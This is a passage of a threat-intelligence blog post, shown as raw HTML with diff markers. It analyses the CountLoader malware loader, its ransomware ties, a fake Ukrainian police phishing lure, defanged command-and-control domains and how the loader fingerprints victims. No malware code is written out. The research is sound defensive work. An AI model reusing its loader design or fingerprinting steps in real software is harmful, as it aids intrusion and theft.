+	<li role="menuitem" id="menu-item-651" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://www.silentpush.com/company/careers/" tabindex="0"><span class="avia-menu-text">Careers</span></a></li>
+</ul>
+</li>
+<li role="menuitem" id="menu-item-12687" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-top-level menu-item-top-level-4"><span class="menu-item-inner no-link"  tabindex="0"><span class="avia-menu-text">Research</span></span>
+
+
+<ul role="menu" class="sub-menu">
+	<li role="menuitem" id="menu-item-12684" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://www.silentpush.com/research-hub/" tabindex="0"><span class="avia-menu-text">Research Hub</span></a></li>
+	<li role="menuitem" id="menu-item-16810" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://www.silentpush.com/join-slack/" tabindex="0"><span class="avia-menu-text">Slack Community</span></a></li>
+</ul>
+</li>
+<li role="menuitem" id="menu-item-653" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-top-level menu-item-top-level-5"><span class="menu-item-inner no-link"  tabindex="0"><span class="avia-menu-text">Resources</span></span>
+
+
+<ul role="menu" class="sub-menu">
+	<li role="menuitem" id="menu-item-17073" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://www.silentpush.com/the-pushback-episodes/" tabindex="0"><span class="avia-menu-text">The Pushback Podcast</span></a></li>
+	<li role="menuitem" id="menu-item-655" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://www.silentpush.com/blog/" tabindex="0"><span class="avia-menu-text">Blog</span></a></li>
+	<li role="menuitem" id="menu-item-11626" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://www.silentpush.com/resources/reports-and-white-papers/" tabindex="0"><span class="avia-menu-text">Reports and White Papers</span></a></li>
+	<li role="menuitem" id="menu-item-3205" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://www.silentpush.com/resources/webinars-workshops/" tabindex="0"><span class="avia-menu-text">Webinars and Workshops</span></a></li>
+	<li role="menuitem" id="menu-item-656" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://www.silentpush.com/resources/videos/" tabindex="0"><span class="avia-menu-text">Videos</span></a></li>
+</ul>
+</li>
+<li role="menuitem" id="menu-item-5175" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-top-level menu-item-top-level-6"><a class="menu-item-inner" href="https://www.silentpush.com/blog/" tabindex="0"><span class="avia-menu-text">Blog</span></a></li>
+</ul></div>			<div class="menu-secondary-menu-container"><ul id="menu-secondary-menu" class="main-menu" role="menu"><li role="menuitem" id="menu-item-3846" class="is-blue menu-item menu-item-type-post_type menu-item-object-page av-menu-button av-menu-button-bordered menu-item-top-level menu-item-top-level-1"><a class="menu-item-inner" href="https://www.silentpush.com/book-a-demo/" tabindex="0"><span class="avia-menu-text">Book A Demo</span></a></li>
+<li role="menuitem" id="menu-item-663" class="is-red menu-item menu-item-type-post_type menu-item-object-page av-menu-button av-menu-button-bordered menu-item-top-level menu-item-top-level-2"><a class="menu-item-inner" href="https://www.silentpush.com/community-edition/" tabindex="0"><span class="avia-menu-text">Community Edition</span></a></li>
+<li role="menuitem" id="menu-item-337" class="login-menu menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-top-level menu-item-top-level-3"><span class="menu-item-inner no-link"  tabindex="0"><span class="avia-menu-text">Login</span></span>
+
+
+<ul role="menu" class="sub-menu">
+	<li role="menuitem" id="menu-item-661" class="menu-item menu-item-type-custom menu-item-object-custom"><a class="menu-item-inner" target="_blank" href="https://explore.silentpush.com/login" tabindex="0" rel="noopener"><span class="avia-menu-text">Community</span></a></li>
+	<li role="menuitem" id="menu-item-662" class="menu-item menu-item-type-custom menu-item-object-custom"><a class="menu-item-inner" target="_blank" href="https://app.silentpush.com/login" tabindex="0" rel="noopener"><span class="avia-menu-text">Enterprise</span></a></li>
+	<li role="menuitem" id="menu-item-11411" class="menu-item menu-item-type-custom menu-item-object-custom"><a class="menu-item-inner" href="https://partner.silentpush.com/portal" tabindex="0"><span class="avia-menu-text">Partner Portal</span></a></li>
+</ul>
+</li>
+</ul></div>		</div>
+		<button class="hamburger-toggle" aria-label="Mobile Menu Toggle">
+			<div class="burger-box"></div>
+		</button>
+	</div>
+	<div class="hamburger-overlay"></div>
+	<div class="hamburger-content">
+		<div class="hamburger-content-inner">
+			<div class="menu-main-menu-container"><ul id="menu-main-menu-1" class="main-menu" role="menu"><li role="menuitem" id="menu-item-635" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-top-level menu-item-top-level-1"><span class="menu-item-inner no-link"  tabindex="0"><span class="avia-menu-text">Platform</span></span>
+
+
+<ul role="menu" class="sub-menu">
+	<li role="menuitem" id="menu-item-11961" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://www.silentpush.com/platform/" tabindex="0"><span class="avia-menu-text">Overview</span></a></li>
+	<li role="menuitem" id="menu-item-638" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://www.silentpush.com/threat-hunting/" tabindex="0"><span class="avia-menu-text">Threat Hunting</span></a></li>
+	<li role="menuitem" id="menu-item-639" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://www.silentpush.com/brand-protection/" tabindex="0"><span class="avia-menu-text">Brand Protection</span></a></li>
+	<li role="menuitem" id="menu-item-637" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://www.silentpush.com/automated-intelligence/" tabindex="0"><span class="avia-menu-text">Automated Intelligence</span></a></li>
+	<li role="menuitem" id="menu-item-14643" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://www.silentpush.com/traffic-origin/" tabindex="0"><span class="avia-menu-text">Traffic Origin</span></a></li>
+	<li role="menuitem" id="menu-item-640" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://www.silentpush.com/api/" tabindex="0"><span class="avia-menu-text">API</span></a></li>
+	<li role="menuitem" id="menu-item-652" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://www.silentpush.com/integrations/" tabindex="0"><span class="avia-menu-text">Integrations</span></a></li>
+</ul>
+</li>
+<li role="menuitem" id="menu-item-642" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-top-level menu-item-top-level-2"><span class="menu-item-inner no-link"  tabindex="0"><span class="avia-menu-text">Solutions</span></span>
+
+
+<ul role="menu" class="sub-menu">
+	<li role="menuitem" id="menu-item-12893" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://www.silentpush.com/the-silent-push-difference/" tabindex="0"><span class="avia-menu-text">The Silent Push Difference</span></a></li>
+	<li role="menuitem" id="menu-item-13033" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://www.silentpush.com/solutions/industries/" tabindex="0"><span class="avia-menu-text">Industries</span></a></li>
+	<li role="menuitem" id="menu-item-10981" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://www.silentpush.com/solutions/use-cases/" tabindex="0"><span class="avia-menu-text">Use Cases</span></a></li>
+</ul>
+</li>
+<li role="menuitem" id="menu-item-646" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-top-level menu-item-top-level-3"><span class="menu-item-inner no-link"  tabindex="0"><span class="avia-menu-text">Company</span></span>
+
+
+<ul role="menu" class="sub-menu">
+	<li role="menuitem" id="menu-item-13824" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://www.silentpush.com/company/" tabindex="0"><span class="avia-menu-text">Our Story</span></a></li>
+	<li role="menuitem" id="menu-item-648" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://www.silentpush.com/company/team/" tabindex="0"><span class="avia-menu-text">Leadership Team</span></a></li>
+	<li role="menuitem" id="menu-item-13221" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://www.silentpush.com/company/news/" tabindex="0"><span class="avia-menu-text">News</span></a></li>
+	<li role="menuitem" id="menu-item-650" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://www.silentpush.com/company/partners/" tabindex="0"><span class="avia-menu-text">Partners</span></a></li>
+	<li role="menuitem" id="menu-item-651" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://www.silentpush.com/company/careers/" tabindex="0"><span class="avia-menu-text">Careers</span></a></li>
+</ul>
+</li>
+<li role="menuitem" id="menu-item-12687" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-top-level menu-item-top-level-4"><span class="menu-item-inner no-link"  tabindex="0"><span class="avia-menu-text">Research</span></span>
+
+
+<ul role="menu" class="sub-menu">
+	<li role="menuitem" id="menu-item-12684" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://www.silentpush.com/research-hub/" tabindex="0"><span class="avia-menu-text">Research Hub</span></a></li>
+	<li role="menuitem" id="menu-item-16810" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://www.silentpush.com/join-slack/" tabindex="0"><span class="avia-menu-text">Slack Community</span></a></li>
+</ul>
+</li>
+<li role="menuitem" id="menu-item-653" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-top-level menu-item-top-level-5"><span class="menu-item-inner no-link"  tabindex="0"><span class="avia-menu-text">Resources</span></span>
+
+
+<ul role="menu" class="sub-menu">
+	<li role="menuitem" id="menu-item-17073" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://www.silentpush.com/the-pushback-episodes/" tabindex="0"><span class="avia-menu-text">The Pushback Podcast</span></a></li>
+	<li role="menuitem" id="menu-item-655" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://www.silentpush.com/blog/" tabindex="0"><span class="avia-menu-text">Blog</span></a></li>
+	<li role="menuitem" id="menu-item-11626" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://www.silentpush.com/resources/reports-and-white-papers/" tabindex="0"><span class="avia-menu-text">Reports and White Papers</span></a></li>
+	<li role="menuitem" id="menu-item-3205" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://www.silentpush.com/resources/webinars-workshops/" tabindex="0"><span class="avia-menu-text">Webinars and Workshops</span></a></li>
+	<li role="menuitem" id="menu-item-656" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://www.silentpush.com/resources/videos/" tabindex="0"><span class="avia-menu-text">Videos</span></a></li>
+</ul>
+</li>
+<li role="menuitem" id="menu-item-5175" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-top-level menu-item-top-level-6"><a class="menu-item-inner" href="https://www.silentpush.com/blog/" tabindex="0"><span class="avia-menu-text">Blog</span></a></li>
+</ul></div>			<div class="menu-secondary-menu-container"><ul id="menu-secondary-menu-1" class="main-menu" role="menu"><li role="menuitem" id="menu-item-3846" class="is-blue menu-item menu-item-type-post_type menu-item-object-page av-menu-button av-menu-button-bordered menu-item-top-level menu-item-top-level-1"><a class="menu-item-inner" href="https://www.silentpush.com/book-a-demo/" tabindex="0"><span class="avia-menu-text">Book A Demo</span></a></li>
+<li role="menuitem" id="menu-item-663" class="is-red menu-item menu-item-type-post_type menu-item-object-page av-menu-button av-menu-button-bordered menu-item-top-level menu-item-top-level-2"><a class="menu-item-inner" href="https://www.silentpush.com/community-edition/" tabindex="0"><span class="avia-menu-text">Community Edition</span></a></li>
+<li role="menuitem" id="menu-item-337" class="login-menu menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-top-level menu-item-top-level-3"><span class="menu-item-inner no-link"  tabindex="0"><span class="avia-menu-text">Login</span></span>
+
+
+<ul role="menu" class="sub-menu">
+	<li role="menuitem" id="menu-item-661" class="menu-item menu-item-type-custom menu-item-object-custom"><a class="menu-item-inner" target="_blank" href="https://explore.silentpush.com/login" tabindex="0" rel="noopener"><span class="avia-menu-text">Community</span></a></li>
+	<li role="menuitem" id="menu-item-662" class="menu-item menu-item-type-custom menu-item-object-custom"><a class="menu-item-inner" target="_blank" href="https://app.silentpush.com/login" tabindex="0" rel="noopener"><span class="avia-menu-text">Enterprise</span></a></li>
+	<li role="menuitem" id="menu-item-11411" class="menu-item menu-item-type-custom menu-item-object-custom"><a class="menu-item-inner" href="https://partner.silentpush.com/portal" tabindex="0"><span class="avia-menu-text">Partner Portal</span></a></li>
+</ul>
+</li>
+</ul></div>		</div>
+	</div>
+</div>
+	<div id='main' class='all_colors' data-scroll-offset='88'>
+
+	<div class="single-content-section avia-section main_color avia-section-default avia-no-border-styling container_wrap fullsize avia-builder-el-0 avia-builder-el-first">
+	<div class="container">
+		<div class="content">
+			<div class="entry-content-wrapper">
+				<div class="single-post-header">
+
+
+					<h1 class="entry-title">CountLoader: Silent Push Discovers New Malware Loader Being Served in 3 Different Versions</h1>                    <div class='ep-post-terms term-tag'><a class='ep-item-term ep-item-term-threat' href='https://www.silentpush.com/tag/threat/' >threat</a></div>					<div class="single-post-meta">
+												<div class="single-post-date">
+							September 18, 2025						</div>
+					</div>
+
+												<div class="single-post-thumbnail "><img width="1024" height="576" src="https://www.silentpush.com/wp-content/uploads/countloader-main-image.png" class="wp-image-13889 avia-img-lazy-loading-13889 attachment-post-thumbnail size-post-thumbnail wp-post-image" alt="" decoding="async" loading="lazy" /></div>
+						
+				</div>
+				
+<h2 class="wp-block-heading" id="Key-Findings">Key Findings</h2>
+
+
+
+<ul class="wp-block-list">
+<li>Silent Push has discovered a new malware loader that is strongly associated with Russian ransomware gangs that we are naming: “CountLoader.”</li>
+
+
+
+<li>Our team has observed this evolving threat being served as three separate versions: .NET, PowerShell, and JScript.</li>
+
+
+
+<li>Based on our observations and technical evidence, we believe CountLoader is being used either as part of an Initial Access Broker&#8217;s (IAB&#8217;s) toolset or by a ransomware affiliate with ties to the&nbsp;LockBit,&nbsp;BlackBasta, and&nbsp;Qilin&nbsp;ransomware groups.</li>
+
+
+
+<li>CountLoader was also recently used in a PDF-based phishing lure targeting individuals in Ukraine, in a campaign that impersonated the Ukrainian police.</li>
+</ul>
+
+
+
+<h2 class="wp-block-heading" id="Executive-Summary">Executive Summary</h2>
+
+
+
+<p class="wp-block-paragraph">Silent Push Threat Analysts are tracking the spread of a new malware loader we have named “CountLoader,” that is strongly associated with Russian ransomware gangs. The evolving threat is served in three versions: .NET, PowerShell, and JScript, and was recently used in a phishing lure targeting individuals in Ukraine as part of a campaign impersonating Ukrainian police.</p>
+
+
+
+<p class="wp-block-paragraph">Our analysis has observed CountLoader dropping several malware agents, like CobaltStrike and AdaptixC2. Technical evidence obtained from within these samples allowed our team to make the connection between the agents dropped by CountLoader and the malware agents observed in several ransomware attacks. Based on this observation, we assess with medium-high confidence that CountLoader is being used either as part of the toolset of an IAB or by a ransomware affiliate with ties to the&nbsp;<strong>LockBit</strong>,&nbsp;<strong>BlackBasta</strong>, and&nbsp;<strong>Qilin</strong>&nbsp;ransomware groups.</p>
+
+
+
+<p class="wp-block-paragraph">Kaspersky researchers identified a portion of CountLoader’s operations in June 2025. However, they were only able to identify the PowerShell version, which at the time utilized a “DeepSeek” AI phishing lure to trick users into downloading and executing it. Our team identified indications of several additional unique campaigns utilizing various other lures and targeting methods, including a .NET version of CountLoader, which was named <em><strong>twitter1[.]exe</strong></em>.</p>
+
+
+
+<p class="wp-block-paragraph">Organizations frequently targeted by Russian cybercrime, ransomware groups, or Advanced Persistent Threat (APT) groups are encouraged to integrate our Indicators Of Future Attack™ (IOFA™) feeds for CountLoader into their security stack to defend against this continuously evolving threat.</p>
+
+
+
+<hr class="wp-block-separator has-alpha-channel-opacity"/>
+
+
+
+<div class="wp-block-yoast-seo-table-of-contents yoast-table-of-contents"><h2>Table of contents</h2><ul><li><a href="#Key-Findings" data-level="2">Key Findings</a></li><li><a href="#Executive-Summary" data-level="2">Executive Summary</a></li><li><a href="#Sign-Up-for-a-Free-Silent-Push-Community-Edition-Account" data-level="2">Sign Up for a Free Silent Push Community Edition Account</a></li><li><a href="#Background" data-level="2">Background</a></li><li><a href="#Initial-Observations" data-level="2">Initial Observations</a><ul><li><a href="#h-testing-for-fingerprints" data-level="3">Testing for Fingerprints</a></li></ul></li><li><a href="#Targeting-Ukrainian-Citizens-with-a-Fake-Ukrainian-Police-PDF-Lure" data-level="2">Targeting Ukrainian Citizens with a Fake Ukrainian Police PDF Lure</a></li><li><a href="#CountLoader-Malware-Variants" data-level="2">CountLoader Malware Variants</a></li><li><a href="#CountLoader-JScript-/-.hta-file-Version" data-level="2">CountLoader JScript / .hta file Version</a><ul><li><a href="#h-uncovering-countloader-s-functionality" data-level="3">Uncovering CountLoader&#8217;s Functionality</a></li></ul></li><li><a href="#Analysis-of-CountLoader’s-.NET-Version" data-level="2">Analysis of CountLoader Malware Loader’s .NET Version</a></li><li><a href="#CountLoader-PowerShell-Version" data-level="2">CountLoader PowerShell Version</a></li><li><a href="#CountLoader-Payload-Analysis" data-level="2">CountLoader Payload Analysis</a></li><li><a href="#The-Ransomware/IAB-Connection" data-level="2">The Ransomware/IAB Connection</a><ul><li><a href="#h-detection-of-a-crucial-element" data-level="3">Detection of a Crucial Element</a></li><li><a href="#h-further-analysis" data-level="3">Further Analysis</a></li><li><a href="#h-additional-external-research" data-level="3">Additional External Research</a></li></ul></li><li><a href="#Mitigation" data-level="2">Mitigation</a></li><li><a href="#Sample-CountLoader-Indicators-Of-Future-Attack™-(IOFA™)-List" data-level="2">Sample CountLoader Indicators Of Future Attack™ (IOFA™) List</a></li><li><a href="#Continuing-to-Track-CountLoader" data-level="2">Continuing to Track CountLoader Malware Loader</a></li></ul></div>
+
+
+
+<hr class="wp-block-separator has-alpha-channel-opacity"/>
+
+
+
+<h2 class="wp-block-heading" id="Sign-Up-for-a-Free-Silent-Push-Community-Edition-Account">Sign Up for a Free Silent Push Community Edition Account</h2>
+
+
+
+<p class="wp-block-paragraph">Register now for our free Community Edition to use all the tools and queries highlighted in this blog.</p>
+
+
+
+<div class="wp-block-buttons is-content-justification-center is-layout-flex wp-container-core-buttons-is-layout-fe48e5de wp-block-buttons-is-layout-flex">
+<div class="wp-block-button"><a class="wp-block-button__link wp-element-button" href="https://www.silentpush.com/community-edition/">Sign Up Here</a></div>
+</div>
+
+
+
+<hr class="wp-block-separator has-alpha-channel-opacity"/>
+
+
+
+<h2 class="wp-block-heading" id="Background">Background</h2>
+
+
+
+<p class="wp-block-paragraph">While monitoring for new threats, our team recently discovered a malware sample with unique behavior and varied attribution descriptions in <a href="https://www.virustotal.com/gui/file/08393e7b588035251e8f33b0c80b7f5c33501464ab7f74867470ea5d641c15f1/relations">VirusTotal</a>. After a thorough investigation, we were able to confirm the sample was a new malware loader we assess to be associated with multiple ransomware groups, primarily Russian-speaking cybercriminals. This campaign was observed to be targeting citizens in Ukraine with a Ukrainian police phishing lure, strengthening suspicions of its ties to Russian threat actors.</p>
+
+
+
+<p class="wp-block-paragraph">After an initial open source review, our team found several public reports that mentioned the domains <em><strong>app-updater[.]app</strong></em>, <em><strong>app-updater1[.]app</strong></em>, and <em><strong>app-updater2[.]app</strong></em>. One of the domains, <em><strong>app-updater1[.]app</strong></em>, was suspected of downloading a malicious implant by Kaspersky, as shared in their <a href="https://securelist.com/browservenom-mimicks-deepseek-to-use-malicious-proxy/115728/">Securelist</a> report on June 11, 2025. No binary was downloaded, however, and their team was unable to investigate further at the time.</p>
+
+
+<div class="wp-block-image">
+<figure class="aligncenter size-full"><img loading="lazy" decoding="async" width="852" height="171" src="https://www.silentpush.com/wp-content/uploads/cloader-image-1.png" alt="Securelist report screenshot mentioning the domain “app-updater1[.]app”" class="wp-image-13892"/><figcaption class="wp-element-caption"><em>Securelist report mentioning the domain “app-updater1[.]app”</em></figcaption></figure>
+</div>
+
+
+<p class="wp-block-paragraph"></p>
+
+
+
+<p class="wp-block-paragraph"><a href="https://www.cyfirma.com/news/weekly-intelligence-report-20-june-2025/">Cyfirma also reported</a> a similar campaign, though again, there were no significant details on what was happening with the command and control (C2) domain: <em><strong>app-updater[.]app</strong></em>.</p>
+
+
+
+<p class="wp-block-paragraph">Taking this into account, our team discovered that what was being observed here was actually part of the loader’s primary code loop. CountLoader attempts a connection to many different C2s, retrying up to a million times, and we believe this partial activity is what both Cyfirma and Kaspersky were observing in their respective reports.</p>
+
+
+
+<p class="wp-block-paragraph">Digging deeper, our team then observed several different versions of the malware, written in .NET, PowerShell, and JScript, respectively. Only the PowerShell version of the three has been referenced in public reporting so far (via Kaspersky).</p>
+
+
+
+<p class="wp-block-paragraph">The main version we have observed is the JScript-based version, which is wrapped in an HTML application. It is the most thorough implementation, offering six different methods for file downloading, three different methods for executing various downloadable malware binaries, and a predefined function to identify a victim&#8217;s device based on Windows domain information.</p>
+
+
+
+<hr class="wp-block-separator has-alpha-channel-opacity"/>
+
+
+
+<h2 class="wp-block-heading" id="Initial-Observations">Initial Observations</h2>
+
+
+
+<p class="wp-block-paragraph">We began our investigation by following the discovery of a malware sample in <a href="https://www.virustotal.com/gui/file/08393e7b588035251e8f33b0c80b7f5c33501464ab7f74867470ea5d641c15f1/relations">VirusTotal</a>, which contacted several domains with an apparently unique communication pattern of shared use of the “<strong>/api/getFile?fn=</strong>” path across the domains.</p>
+
+
+
+<p class="wp-block-paragraph">As C2 communications in malware are often unique, our team decided to investigate this pattern and see what more we could find.</p>
+
+
+<div class="wp-block-image">
+<figure class="aligncenter size-full"><img loading="lazy" decoding="async" width="1920" height="866" src="https://www.silentpush.com/wp-content/uploads/cloader-image-2.png" alt="Screenshot of VirusTotal snapshot of the shared path" class="wp-image-13893"/><figcaption class="wp-element-caption"><em>VirusTotal snapshot of the shared path</em></figcaption></figure>
+</div>
+
+
+<h3 class="wp-block-heading" id="h-testing-for-fingerprints">Testing for Fingerprints</h3>
+
+
+
+<p class="wp-block-paragraph">Taking two of the known domains, <em><strong>app-updater[.]app</strong></em> and <em><strong>app-updater1[.]app</strong></em>, and dropping them into our Web Scanner, our team was able to use the “Compare” feature to identify shared attributes swiftly. This is a common technique in our investigations, as it allows for the easy creation and testing of more accurate fingerprints.</p>
+
+
+
+<p class="wp-block-paragraph">After some validation testing, our team put together a solid fingerprint combining our <strong>HHV</strong>, <strong>JARM</strong>, <strong>Response</strong>, and <strong>ssl.CHV</strong> fields into a single query that covers a large number of related domains for this threat. Descriptions of each field are noted below, though some details are omitted for operational security reasons (which are also available to our enterprise customers):</p>
+
+
+
+<ul class="wp-block-list">
+<li>The <strong>HHV</strong> field is a Silent Push proprietary hash value based on the header keys.</li>
+
+
+
+<li>The <strong>JARM</strong> field fingerprint is a hash value derived from various characteristics of the TLS handshake.</li>
+
+
+
+<li>The <strong>Response </strong>field describes the response code returned by a scan request.</li>
+
+
+
+<li>The <strong>ssl.CHV</strong> field is another Silent Push proprietary hash based on SSL data from SSL certificates.</li>
+</ul>
+
+
+
+<p class="wp-block-paragraph">These fields enabled us to detect additional domains used by CountLoader and, as of this writing (August 2025), we have discovered 20+ unique domains. Enterprise customers have access to a comprehensive report that contains our full, unredacted analysis on this threat.</p>
+
+
+
+<p class="wp-block-paragraph">As referenced before, during an open source review, our team found two additional sources where some of the domains had been referenced:</p>
+
+
+
+<ul class="wp-block-list">
+<li>Threat researcher <a href="https://x.com/SquiblydooBlog/status/1916044910966542743">Squiblydoo</a> made a meaningful post on his X/Twitter account, writing, “<em>The malware sets a script to download a payload from gameupdate-endpoint[.]com and will steal data from your computer.</em>”</li>
+
+
+
+<li>In the URLhaus malware database, <em><strong>urlhaus[.]abuse[.]ch</strong></em>, our team found several domains labeled “delivering Vidar Infostealer and Emmenhtal malware,” according to the initial reporters.</li>
+</ul>
+
+
+<div class="wp-block-image">
+<figure class="aligncenter size-full"><img loading="lazy" decoding="async" width="1211" height="268" src="https://www.silentpush.com/wp-content/uploads/cloader-image-3.png" alt="Screenshot of the URLhaus results" class="wp-image-13894"/><figcaption class="wp-element-caption"><em>Screenshot of the URLhaus results</em></figcaption></figure>
+</div>
+
+
+<p class="wp-block-paragraph">Given the variety of malware types reported with these C2 domains, our team suspected the domains dropping the malware were associated with this new malware loader, which we were later able to confirm.</p>
+
+
+
+<hr class="wp-block-separator has-alpha-channel-opacity"/>
+
+
+
+<h2 class="wp-block-heading" id="Targeting-Ukrainian-Citizens-with-a-Fake-Ukrainian-Police-PDF-Lure">Targeting Ukrainian Citizens with a Fake Ukrainian Police PDF Lure</h2>
+
+
+
+<p class="wp-block-paragraph">During our investigation, an interesting .zip file named “vymoha_na_yavku” was found to contact <em><strong>ms-team-ping[.]com</strong></em>. We confirmed this was related to our newly discovered cluster of malicious CountLoader domains.</p>
+
+
+<div class="wp-block-image">
+<figure class="aligncenter size-full"><img loading="lazy" decoding="async" width="1920" height="1011" src="https://www.silentpush.com/wp-content/uploads/cloader-image-4-vt-zip.png" alt="Checking a .zip file on VirusTotal confirmed its relation to the malicious CountLoader domains cluster" class="wp-image-13895"/><figcaption class="wp-element-caption"><em>Checking a .zip file on VirusTotal confirmed its relation to the malicious CountLoader domains cluster</em></figcaption></figure>
+</div>
+
+
+<p class="wp-block-paragraph">We then analyzed a sample. This analysis revealed an ongoing PDF-based lure campaign that remains active at the time of writing this blog (August 2025).</p>
+
+
+<div class="wp-block-image">
+<figure class="aligncenter size-full"><img loading="lazy" decoding="async" width="955" height="835" src="https://www.silentpush.com/wp-content/uploads/cloader-image-5-pdf-lure-ukr-police.png" alt="Screenshot of the PDF lure impersonating the Ukrainian police" class="wp-image-13896"/><figcaption class="wp-element-caption"><em>Screenshot of the PDF lure impersonating the Ukrainian police</em></figcaption></figure>
+</div>
+
+
+<p class="wp-block-paragraph"></p>
+
+
+
+<p class="wp-block-paragraph">When translating the PDF into English, the following message from the (supposed) “National Police of Ukraine” appears:</p>
+
+
+<div class="wp-block-image">
+<figure class="aligncenter size-full"><img loading="lazy" decoding="async" width="1222" height="1720" src="https://www.silentpush.com/wp-content/uploads/cloader-image-6-translated-police-lure.png" alt="Screenshot of translated PDF (purportedly) originating from the National Police of Ukraine" class="wp-image-13897"/><figcaption class="wp-element-caption"><em>Screenshot of translated PDF (purportedly) originating from the National Police of Ukraine</em></figcaption></figure>
+</div>
+
+
+<hr class="wp-block-separator has-alpha-channel-opacity"/>
+
+
+
+<h2 class="wp-block-heading" id="CountLoader-Malware-Variants">CountLoader Malware Variants</h2>
+
+
+
+<p class="wp-block-paragraph">As previously referenced, our team observed three different versions of the CountLoader malware. We will now examine each of them in turn, beginning with the JScript version, which we have identified as the main CountLoader implant, followed by the .NET binary and PowerShell binary versions.</p>
+
+
+
+<h2 class="wp-block-heading" id="CountLoader-JScript-/-.hta-file-Version">CountLoader JScript / .hta file Version</h2>
+
+
+
+<p class="wp-block-paragraph">The JScript-based version has around 850 lines of code. It outshines both the .NET version and the PowerShell version in terms of both length and functionality. In this form, CountLoader is delivered to its victims in the form of an .hta file, which is obfuscated using the free and open-source <em><strong>obfuscator[.]io</strong></em> tool referenced earlier.</p>
+
+
+
+<p class="wp-block-paragraph">The .hta file extension is the default file extension for an HTML Application file, a proprietary executable format by Microsoft. Threat actors regularly abuse this file type to deliver executable code to devices that have no user interface. Typically, .hta files are executed using the proprietary Microsoft Windows binary “<em>mshta.exe</em>.”</p>
+
+
+
+<p class="wp-block-paragraph">After deobfuscating the code and renaming a few variables for legibility, we uncovered the functionality (viewable in the screenshot below), which we will now cover in detail:</p>
+
+
+<div class="wp-block-image">
+<figure class="aligncenter size-full"><img loading="lazy" decoding="async" width="1920" height="1052" src="https://www.silentpush.com/wp-content/uploads/cloader-image-7-code-js.png" alt="Screenshot of the code we observed for CountLoader’s JScript version" class="wp-image-13898"/><figcaption class="wp-element-caption"><em>Screenshot of the code we observed for CountLoader’s JScript version</em></figcaption></figure>
+</div>
+
+
+<h3 class="wp-block-heading" id="h-uncovering-countloader-s-functionality">Uncovering CountLoader&#8217;s Functionality</h3>
+
+
+
+<p class="wp-block-paragraph">Upon execution, CountLoader first checks to see if it has already performed an initialization on the victim&#8217;s system. This is done by determining if the .hta file is executed from a URL that contains “<strong>/start</strong>” in the path.</p>
+
+
+
+<p class="wp-block-paragraph">If that is not the case, some initialization commands are run at a later point in the execution flow.</p>
+
+
+
+<p class="wp-block-paragraph">After initial checks, the execution flow continues by collecting system information:</p>
+
+
+
+<ol start="1" class="wp-block-list">
+<li>Calculate the current date and time. Add 10 minutes.</li>
+
+
+
+<li>Convert to ISO 8601 formatted datetime string in the format: <strong>YYYY-MM-DDTHH:MM:00.</strong></li>
+
+
+
+<li>Define a variable and assign the value “env”. It is assumed that this variable is used to identify different campaigns since it is used at a later point as part of the C2 connection process.</li>
+
+
+
+<li>Generate a Victim ID by ingesting different Hardware ID values via the process:</li>
+</ol>
+
+
+
+<p class="wp-block-paragraph">a. Starts with the username</p>
+
+
+
+<p class="wp-block-paragraph">b. Adds the first non-null processor ID it finds.</p>
+
+
+
+<p class="wp-block-paragraph">c. Adds the first non-null system UUID it finds.</p>
+
+
+
+<p class="wp-block-paragraph">d. Adds the first non-null disk model it finds.</p>
+
+
+
+<p class="wp-block-paragraph">e. Adds a space character.</p>
+
+
+
+<p class="wp-block-paragraph">f. Adds the first non-null disk serial number it finds.</p>
+
+
+
+<ol start="5" class="wp-block-list">
+<li>Get device name and username.</li>
+
+
+
+<li>Get device antivirus software.</li>
+
+
+
+<li>Get the exact Windows version and processor architecture.</li>
+
+
+
